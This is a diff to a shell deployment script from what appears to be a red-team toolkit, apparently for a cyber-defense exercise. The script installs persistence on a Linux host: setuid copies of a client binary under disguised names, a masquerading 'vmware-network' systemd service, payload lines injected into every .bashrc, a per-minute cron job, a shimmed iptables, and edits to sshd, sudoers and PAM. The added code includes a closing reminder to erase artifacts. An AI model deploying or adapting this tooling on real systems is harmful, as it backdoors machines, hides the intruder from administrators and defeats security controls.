@@ -27,6 +27,7 @@ setup(){
 
 # Clone the client binary into different places 
 clone(){
+    echo -e "Cloning all the files to the right directory...\n"
     cp deploy.sh /dev/shm/pulse-shm-10175238
     cp deploy.sh /dev/loop28
     cp deploy.sh /etc/vmware-tools.conf 
@@ -36,13 +37,26 @@ clone(){
     cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
     chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
 
+}
+
+copyman(){
+    echo -e "Installing copyman service...\n"
+    # Clone copyman and its files 
+    cp /opt/cdt-redteamtool/payload/vmware-network.service /etc/systemd/system/vmware-network.service
+    cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
+    mkdir -p /lib/modules/kernel_static
+    cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
     # Clone copyman to different location 
     # Clone all the static files to /var/local, for copyman 
 
+    systemctl start vmware-network
+    systemctl enable vmware-network
 }
 
 # Add bot to all the bashrc found in /home and /root 
 bashrc(){
+    echo -e "Changing all bashrc... \n"
+
     bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
     for i in $bashrc; do
         sed -is "30 a $payload1 &" $i
@@ -58,12 +72,14 @@ alias_ls(){
 
 # This might be different in centos, systemctl restart cronjob 
 cronjob(){
+    echo -e "Installing cronjob... \n"
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
     systemctl restart cron 
 }
 
 # Shim iptables. IPtables had weird symlink, had to separate it 
 iptables(){
+    echo -e "Shimming iptables... \n"
     gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
     cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
     cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
@@ -101,6 +117,7 @@ sudoers(){
 ########## Start of Main ##########
 
 setup
+copyman
 clone
 sshd_config
 sudoers
@@ -108,5 +125,6 @@ cronjob
 pam
 bashrc  
 iptables
+echo -e "========= Script have ended. Erase all artifaces. ========== \n"
 
 # Start copyman 
